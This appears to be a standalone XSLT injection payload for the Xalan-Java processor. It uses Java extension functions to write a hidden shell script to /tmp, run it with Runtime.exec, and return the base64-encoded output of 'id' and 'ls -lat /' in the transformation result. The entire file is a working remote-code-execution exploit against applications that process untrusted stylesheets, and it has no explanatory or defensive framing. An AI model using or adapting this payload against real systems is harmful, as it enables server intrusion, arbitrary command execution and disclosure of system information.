<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"
  xmlns:fw="http://xml.apache.org/xalan/java/java.io.FileWriter"
  xmlns:proc="http://xml.apache.org/xalan/java/java.lang.Process"
  xmlns:br="http://xml.apache.org/xalan/java/java.io.BufferedReader"
  xmlns:ir="http://xml.apache.org/xalan/java/java.io.InputStreamReader"
  exclude-result-prefixes="rt fw proc br ir">
  <xsl:template match="/">
    <xsl:variable name="w" select="fw:new('/tmp/.wm2.sh')"/>
    <xsl:variable name="a" select="fw:write($w, '#!/bin/sh&#10;{ id; ls -lat /; } 2>&amp;1 | base64 | tr -d &quot;\n&quot;&#10;')"/>
    <xsl:variable name="b" select="fw:close($w)"/>
    <xsl:variable name="p" select="rt:exec(rt:getRuntime(), '/bin/sh /tmp/.wm2.sh')"/>
    <xsl:variable name="r" select="br:new(ir:new(proc:getInputStream($p)))"/>
    <xsl:value-of select="br:readLine($r)"/>
  </xsl:template>
</xsl:stylesheet>
